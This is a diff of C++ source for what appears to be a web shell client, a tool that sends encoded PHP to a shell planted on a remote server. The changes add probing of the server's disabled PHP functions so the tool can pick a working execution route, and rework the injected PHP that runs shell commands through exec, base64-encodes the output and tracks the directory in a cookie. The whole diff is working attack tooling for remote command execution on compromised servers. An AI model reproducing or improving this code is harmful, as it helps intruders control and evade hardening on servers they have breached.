@@ -16,6 +16,10 @@ WebShell::WebShell(string addr, METHOD meth, string password, PLACE paramplace,s
 	this->url = addr;
 	this->Method = meth;
 	this->pass = password;
+	this->initialized=false;
+}
+void WebShell::initialize(){
+	this->get_disabled_functions();
 }
 void WebShell::addClientMethod(ENCRYPT_METHOD meth, string param) {
 	this->EncryptMethod.push_back(make_pair(meth, param));
@@ -23,6 +27,10 @@ void WebShell::addClientMethod(ENCRYPT_METHOD meth, string param) {
 
 CURLcode WebShell::php_exec(string command,string&ans,map<string,string>*addonparams) {
 	srand(time(0));
+	if(!this->initialized){
+		this->initialized=true;
+		this->initialize();
+	}
 	string  mark = to_string(1000*rand());
 	string evalphp;
 	if (find(disabled_functions.begin(), disabled_functions.end(), "eval") == disabled_functions.end())
@@ -99,11 +107,12 @@ CURLcode WebShell::php_exec(string command,string&ans,map<string,string>*addonpa
 	return res;
 }
 void WebShell::get_disabled_functions() {
-	string command = "echo preg_replace('/\\s/','',ini_set('disable_functions'));";
+	string command = "echo preg_replace('/\\s/','',ini_get('disable_functions'));";
 	string ans;
 	CURLcode code=php_exec(command,ans);
 	int begin = 0, end = ans.find(',',0);
-	while (begin != string::npos) {
+	while (end!=-1 && begin <= string::npos) {
+	//	cout<<begin<<'\t'<<end<<endl;
 		this->disabled_functions.push_back(ans.substr(begin,end-begin));
 		begin = end + 1;
 		end = ans.find(',', begin);
@@ -227,7 +236,11 @@ CURLcode WebShell::ShellCommandExec(string command,string& ans) {
 		"{if(is_dir($ans[1]))"
 		"{if(substr($ans[1],0,1)=='/')$dir=$ans[1];"
 		"else $dir.='/'.$ans[1];}}}"
-		"echo base64_encode(exec($a));"
+		"$result=array();"
+		"exec($a,$result);"
+		"$answer='';"
+		"foreach($result as $per){$answer.=$per.'\r\n';}"
+		"echo base64_encode($answer);"
 		"setcookie('dir',$dir);";
 	else if (find(disabled_functions.begin(), disabled_functions.end(), "poen") == disabled_functions.end())
 		phpsentence = "$a='" + command + "';"
